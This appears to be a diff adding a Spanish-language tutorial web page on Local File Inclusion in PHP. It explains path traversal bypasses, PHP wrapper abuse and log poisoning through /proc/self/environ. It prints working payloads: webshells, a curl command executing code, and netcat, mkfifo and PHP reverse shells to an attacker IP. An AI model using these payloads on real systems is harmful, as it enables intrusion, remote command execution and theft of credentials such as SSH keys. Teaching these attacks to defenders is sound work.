@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="es-ES">
+     <head>
+  	<title>LFI</title>
+    	<meta charset="utf-8">
+    	<link rel="icon" type="image/png" href="../../img/logo.png" />
+      	<link rel="stylesheet" href="../decoration/style.css"/>
+     </head>
+
+  	<body>
+
+      	<div class="cuerpo">
+        	<div class="contenido">
+		        <h1 align="center">Local File Inclusion</h1>
+		        <br><br>
+		        <p>La <strong>inclusión de archivos locales (LFI)</strong> permite a un atacante incluir archivos locales, es decir, archivos existentes en el servidor web.
+		        Esta vulnerabilidad existe como consecuencia de un fallo en la programación del código de la página, debido al inadecuado filtrado de los datos por parte del servidor.</p>
+		        <br>
+		        <p>La parte del código vulnerable sería:</p>
+		        <br>
+		        <pre rel="php"><code><font color="red">include</font> $_GET[<font color="#FBFF83">'page'</font>];</code></pre>
+		        <br>
+		        <p>En este código podemos apreciar que a través del parámetro "page", se almacena el archivo introducido por el usuario, para posteriormente incluirlo y mostrar su contenido.<br><br>
+		        Estos datos viajan por el método GET desde la URL de la siguiente forma:</p><br>
+
+		        <pre rel="url"><code>http://localhost:8001?page=index.html</code></pre><br>
+		        
+		        <p>El fallo que tiene este código es que se confía en el input del usuario, es decir, no hay ningún tipo de sanitización de los datos que se introducen, por lo que un atacante, conociendo ciertas rutas sensibles del sistema podría visualizar recursos privilegiados: </p><br>
+		        
+		        <pre rel="url"><code>http://localhost:8001?page=/etc/passwd</code></pre><br>
+		        
+		        <p>Esto le permitirá al atacante visualizar ese recurso sensible y enumerar los usuarios del sistema.<br><br>Se suele aplicar una corrección al código de este tipo:</p><br>
+		        
+		        <pre rel="php"><code>$file <font color="red">=</font> $_GET[<font color="#FBFF83">'page'</font>];
+<font color="red">include</font>(<font color="#FBFF83">'/var/www/html/'</font> <font color="red">.</font> $file);</code></pre><br>
+				
+				<p>Pero tampoco es suficiente, esta validación define que el archivo a buscar debe de estar en la ruta /var/www/html/, aunque esto se puede bypassear con un concepto conocido como <strong>Directory Path Traversal</strong>, el cual consiste en recorrer directorios hacia atrás para evadir la ruta donde se busca el archivo.</p><br>
+				
+				<pre rel="url"><code>http://localhost:8001?page=../../../../../etc/passwd</code></pre><br>
+				
+				<p>Mostrándonos de esta manera dicho recurso.</p><br>
+
+				<p>Para impedir que se logra hacer un Directory Path Traversal existen funciones como str_replace la cual un administrador de un sitio web puede implementar para evitar que un atacante intente recorrer rutas hacia atrás, quedando el código de esta manera:</p><br>
+
+				<pre rel="php"><code>$file <font color="red">=</font> <font color="#7FDCF7"> str_replace</font>(<font color="#FBFF83">'../'</font>,<font color="#FBFF83">''</font>,$_GET[<font color="#FBFF83">'page'</font>]);
+<font color="red">include</font>(<font color="#FBFF83">'/var/www/html/'</font> <font color="red">.</font> $file);</code></pre><br>
+
+				<p>El código muestra cómo se sanitiza el input introducido por el atacante sustituyendo "../" por "" (nada), es decir, lo elimina.<br><br>
+				Pero un atacante intuyendo un poco el código puede mandar una petición de este tipo:</p><br>
+
+				<pre rel="url"><code>http://localhost:8001/index.php?page=....//....//....//....//....//....//....//....//etc/passwd</code></pre><br>
+
+				<p>Saltándose así la restricción añadida y consiguiendo visualizar el archivo</p><br>
+
+				<p>Otra forma para impedir que el atacante pueda acceder a recursos privilegiados es implementar ciertas condiciones nuevas, cómo por ejemplo, que solo se puedan visualizar archivos pdf situados en /var/www/html/</p><br>
+
+				<pre rel="php"><code>$file <font color="red">=</font> $_GET[<font color="#FBFF83">'page'</font>];
+<font color="red">include</font>(<font color="#FBFF83">'/var/www/html/'</font> <font color="red">.</font> $file <font color="red">.</font> <font color="#FBFF83">'.pdf'</font>);</code></pre><br>
+				
+				<p>Aquí la cosa se vuelve bastante complicada, ya que entran en juego otros factores, como la versión de php. Con esto me refiero a que un atacante podía evadir este tipo de filtros añadiendo un null byte codificado en url como <strong>%00</strong>, al final de la url, impidiendo así que se siga leyendo el código y devolver el recurso que se quiera.</p><br>
+
+				<pre rel="url"><code>http://localhost:8001?page=../../../../../etc/passwd%00</code></pre><br>
+
+				<p>Pero un fallo tan grave fue corregido en la versión 5.3.4 de php, de igual manera es útil tenerlo en cuenta.</p><br><br>
+				
+				<!--<p>Otra manera de sustituir el null byte es con un concepto llamado <strong>Path Truncation</strong>, para entender esto, debemos comprender que <i>/etc/passwd</i> es igual que <i>/etc/passwd/././././.</i><br>
+				Teniendo esto claro, debemos saber que si en la mayoria de las instalaciones de php por defecto cualquier archivo no puede exceder los 4096 bytes, por lo que si rellenamos la url podriamos llegar a bypassear esta protección. Esta vulnerabilidad fue reparada junto con el Null Byte.</p>-->
+
+				<p>A continuación, se mostrarán algunos recursos interesantes a visualizar a través de un lfi:</p><br>
+
+				<table width="100%" border="1px">
+					<tr>
+						<th width="30%" height="70px">/etc/passwd</th>
+						<td align="center">Visualizamos todos los usuarios del sistema y la shell que manejan.</td>
+					</tr>
+					<tr>
+						<th width="30%" height="70px">/etc/hosts</th>
+						<td align="center">Visualizamos las ips y al dominio que resuelven.</td>
+					</tr>
+					<tr>
+						<th width="30%" height="70px">/proc/net/fib_trie</th>
+						<td align="center">Muestra las interfaces locales y sus IPs correspondientes, nos permite enumerar otros segmentos.</td>
+					</tr>
+					<tr>
+						<th width="30%" height="70px">/proc/net/tcp</th>
+						<td align="center">Visualizamos puertos internos abiertos que tiene la máquina.</td>
+					</tr>
+					<tr>
+						<th width="30%" height="70px">/proc/sched_debug</th>
+						<td align="center">Visualizamos los procesos que corren en la máquina.</td>
+					</tr>
+					<tr>
+						<th width="30%" height="120px">/etc/ssh/sshd_config</th>
+						<td align="center">Visualizamos la configuración de ssh, también, podemos acceder a /home/usuario/.ssh/id_rsa para visualizar la clave ssh privada en caso de que exista, los potenciales usuarios los encontraremos en el archivo /etc/passwd.</td>
+					</tr>
+
+				</table><br><br>
+
+				<p>En otros sistemas hay mayores medidas de seguridad para prevenir estos tipos de ataques, pero a menudo hay formas de eludir estas nuevas restricciones, aquí entran en juego los wrappers.</p><br>
+
+				<p>Para entender el uso de los wrappers vamos a dejar una pregunta en el aire. <br><br>
+				<strong><i>¿Qué pasaría si mediante un parametro vulnerable intentamos visualizar un archivo php?</i></strong></p><br>
+
+				<p>La respuesta es que no veríamos nada, ya que el código php se interpretaría y jamás se mostraría por pantalla. Para ello disponemos del wrapper: <strong>php://filter</strong>, el cual nos permitirá acceder a distintos flujos de entrada salida  y se utilizan para manipular los datos que se leen o se escriben. <br>
+				Volviendo al parámetro vulnerable, un atacante podría convertir mediante este wrapper la salida normal a una salida en base64, esquivando ciertas restricciones e impidiendo la ejecución del código php.</p><br>
+				
+				<pre rel="url"><code>http://localhost:8001?page=php://filter/convert.base64-encode/resource=login.php</code></pre><br>
+
+				<p>Devolviéndonos por pantalla un chorro en base64, el cual se puede decodificar de la siguiente manera.</p><br>
+				<pre rel="terminal"><code><font size="3" color="red">~$</font> echo PD9waHANCg0KJHBhZ2VbICdib2R5JyBdIC49ICINCjxkaXYgY2xhc3M9XCJib2R5X3BhZGRlZFwiPg0KCTxoMT5WdWxuZXJhYmlsaXR5OiBGaWxlIEluY2x1c2lvbjwvaDE+DQoNCgk8ZGl2IGNsYXNzPVwidnVsbmVyYWJsZV9jb2RlX2FyZWFcIj4NCg0KCQlUbyBpbmNsdWRlIGEgZmlsZSBlZGl0IHRoZSA/cGFnZT1pbmRleC5waHAgaW4gdGhlIFVSTCB0byBkZXRlcm1pbmUgd2hpY2ggZmlsZSBpcyBpbmNsdWRlZC4NCg0KCTwvZGl2Pg0KDQoJPGgyPk1vcmUgaW5mbzwvaDI+DQoJPHVsPg0KCQk8bGk+Ii5kdndhRXh0ZXJuYWxMaW5rVXJsR2V0KCAnaHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9SZW1vdGVfRmlsZV9JbmNsdXNpb24nKS4iPC9saT4NCgkJPGxpPiIuZHZ3YUV4dGVybmFsTGlua1VybEdldCggJ2h0dHA6Ly93d3cub3dhc3Aub3JnL2luZGV4LnBocC9Ub3BfMTBfMjAwNy1BMycpLiI8L2xpPg0KCTwvdWw+DQo8L2Rpdj4NCiI7DQoNCj8+DQo= | base64 -d</code></pre><br>
+				
+				<p>En lo hablado a restricciones no siempre es necesario convertir el output a base64, pero si recomendable, para el caso de archivos que no se listen y que no contengan ningún lenguaje que se interprete en el servidor podríamos usar el mismo wraper de una manera más sencilla.</p><br>
+				
+				<pre rel="url"><code>http://localhost:8001?page=php://filter/resource=/etc/passwd</code></pre><br>
+				
+				<p>Esto nos devolverá por pantalla todo el contenido de dicho archivo.</p><br>
+
+				<p>El wrapper php incluye <strong>php://input</strong>, el cual nos permite introducir datos de manera externa. Para incluir datos externos se necesita que el servidor víctima, en su archivo de configuración PHP tenga habilitadas las flags <strong>allow_url_include</strong> y <strong>allow_url_fopen</strong> para más información sobre esto, valla a la sección de <a href="./../rfi/RemoteFileInclusion.html"><i><strong>Remote File Inclusion</strong></i></a>, ahí se detallará la ruta de ese archivo y mucha otra información interesante.</p><br>
+
+				<p>Una forma de enviar datos es mediante el comando curl:</p><br>
+
+				<pre rel="terminal"><code><font size="3" color="red">~$</font> curl -s -X POST --data "&lt?php system('id'); ?&gt" "http://localhost:8001?page=php://input"</code></pre><br>
+
+				<p>Devolviendo por pantalla todo el contenido de la web y el comando ejecutado a nivel de sistema</p><br>
+
+				<pre rel="output"><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre><br>
+				
+				<p>Existen bastantes más wrappers otro interesante es <strong>file://</strong> el cual nos permitirá acceder al contenido del fichero que especifiquemos, saltándonos ciertas protecciones.</p><br>
+				
+				<pre rel="url"><code>http://localhost:8001?page=file:///etc/passwd</code></pre><br>
+
+				<p>El siguiente wrapper que vamos a explicar es <strong>expect://</strong>. Este wrapper es muy interesante ya que nos permite ejecutar directamente comandos a nivel de sistema, pero de forma predeterminada esta desactivada. Por ejemplo, la siguiente dirección devolvería el comando id ejecutado a nivel de sistema:</p><br>
+
+				<pre rel="url"><code>http://localhost:8001?page=expect://id</code></pre><br>
+
+				<p>El wrapper <strong>data://</strong> lo podemos utilizar para incluir datos <i>externos</i> (Para incluir datos eternos se necesita que el servidor víctima, en su archivo de configuración PHP tenga habilitada la flag <strong>allow_url_include</strong>.</p><br>
+
+				<p>Primero el atacante codificará una webshell en base64.</p><br>
+
+				<pre rel="terminal"><code><font size="3" color="red">~$</font> echo "&lt?php system($_GET['cmd']); ?&gt" | base64</code></pre><br>
+
+				<p>Luego utilizaremos el wrapper <strong>data://</strong> junto con la cadena en base64 generada. Tras esto ya podremos utilizar la variable "cmd" para ejecutar comandos. La petición se vería de esta manera: </p><br>
+
+				<pre rel="url"><code>http://localhost:8001?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id</code></pre><br>
+
+				<p>La cuál arrojaría el resultado del comando id.</p><br>
+
+				<p>Otro wrapper a explicar es <strong>zip://</strong>, este wrapper es muy útil en el caso de que se permita la subida arbitraria de archivos en el sitio web víctima. Aprovechando esto, un atacante puede cargar un código zip malicioso. Este wrapper no está habilitado de forma predeterminada, se puede instalar con el siguiente comando:</p><br>
+
+				<pre rel="terminal"><code><font size="3" color="red">~$</font> apt install phpX.X-zip</code></pre><br>
+
+				<p>Donde <strong>X.X</strong> corresponde a la versión.<br>Un atacante se podrá aprovechar de esto creando un php malicioso.</p><br>
+
+				<pre rel="terminal"><code><font size="3" color="red">~$</font> echo "&lt?php system($_GET['cmd']); ?&gt" &gt exec.php
+<font size="3" color="red">~$</font> zip evil.zip exec.php
+<font size="3" color="red">~$</font> rm exec.php</code></pre><br>
+
+				<p>Cuando este archivo se suba, podremos utilizar este wrapper para ejecutar comandos sobre el sistema.</p><br>
+
+				<pre rel="url"><code>http://localhost:8001?page=zip://upload/evil.zip%23exec.php&cmd=id</code></pre><br>
+
+				<p>El cuál nos devolverá el comando el resultado del comando id. Cabe añadir que la "#" esta codificada en url encode como "%23" para evitar que el navegador lo reconozca como un fragmento.</p><br>
+
+				<p>Otro interesante es <strong>http://</strong> que nos permitirá además de listar archivos, acceder a urls, es decir, estaríamos explotando otra vulnerabilidad, llamada remote file inclusion (rfi), la cual aprenderemos más adelante. Cabe añadir que porque se produzca lfi, no por ello también se produce rfi y que si desde el wrapper http:// accedemos al localhost de dicho servidor, la inclusion no sería remota (rfi).<br><br>
+				Existen más tipos de wrapers los cuales se definen en esta url:
+				<a href="https://www.php.net/manual/es/wrappers.php"><i><strong>https://www.php.net/manual/es/wrappers.php</strong></i></a>
+				<br><br>
+				Otra técnica que podemos llevar a cabo involucra el archivo <strong>/proc/self/environ</strong>, el cual contiene las variables de entorno, las cuales podemos utilizar para obtener una reverse shell. Cabe añadir que en sistemas actuales este archivo solo es visible por el usuario <strong>root</strong>, por lo que a no ser que dicho usuario sea quien maneje el servicio no podríamos tirar por aquí.<br><br>
+				Para obtener una shell debemos modificar la petición, esto es sencillo si lo hacemos a través de un proxy como burp, las líneas a modificar son:</p><br>
+
+				<pre rel="petición"><code>GET /index.php?page=/proc/self/environ&cmd=whoami HTTP/1.1
+User-Agent: &lt?php system($_GET["cmd"]);?&gt</code></pre><br>
+
+				<p>El resultado será: User-Agent= "usuario". Generalmente suele ser www-data.<br><br>
+				Ahora podrémos abrirnos una shell por netcat, para ello el atacante pondrá un puerto a la escucha en su máquina</p><br>
+
+				<pre rel="terminal"><code><font size="3" color="red">~$</font> nc -nlvp 4444</code></pre><br>
+
+				<p>Tras poner el puerto a la escucha el atacante deberá enviarse una shell a su ip por el puerto que ha abierto.</p><br>
+
+				<pre rel="petición"><code>GET /index.php?page=/proc/self/environ&cmd=nc -e /bin/bash 192.168.1.10 4444 HTTP/1.1
+User-Agent: &lt?php system($_GET["cmd"]);?&gt</code></pre><br>
+
+				<p>Finalmente debemos codificarlo en url encode antes de tramitar la petición, subrayando el texto en burp suite y tecleando <strong>Ctrl + u</strong>. Quedando de esta manera:</p><br>
+
+				<pre rel="petición"><code>GET /index.php?page=/proc/self/environ$cmd=nc+-e+/bin/sh+192.168.1.10+4444 HTTP/1.1</code></pre><br>
+
+				<p>Si nos ponemos más tiquismiquis debemos tener en cuenta que el parámetro <strong>-e</strong> de netcat es relativamente moderno por lo que debemos tener en mano distintos métodos de abrirnos una reverse shell, por ejemplo, por mkfifo (versión antigua de netcat).</p><br>
+
+				<pre rel="terminal"><code><font size="3" color="red">~$</font> rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.10 4444 > /tmp/f</code></pre><br>
+				
+				<p>O por php:</p><br>
+				
+				<pre rel="terminal"><code><font size="3" color="red">~$</font> php -r '$sock=fsockopen("192.168.1.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre><br>
+				
+				<p>Hay muchas otras formas de abrirnos una reverse shell, dejo un enlace en el cual se definen todas las formas que hay para abrir una reverse shell:<br>
+				<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"><i><strong>http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</strong></i></a>
+				<br><br>
+				Como punto final a añadir, si visualizamos los recursos desde el navegador, no suelen tener el formato correcto, pero si ejecutamos el comando curl con la url, la información saldrá preformateada, es decir, en su formato correcto.</p>
+        	</div>
+    	</div>
+    	<footer>
+      		<marquee>Local File Inclusion</marquee>
+    	</footer>
+  	</body>
+</html>
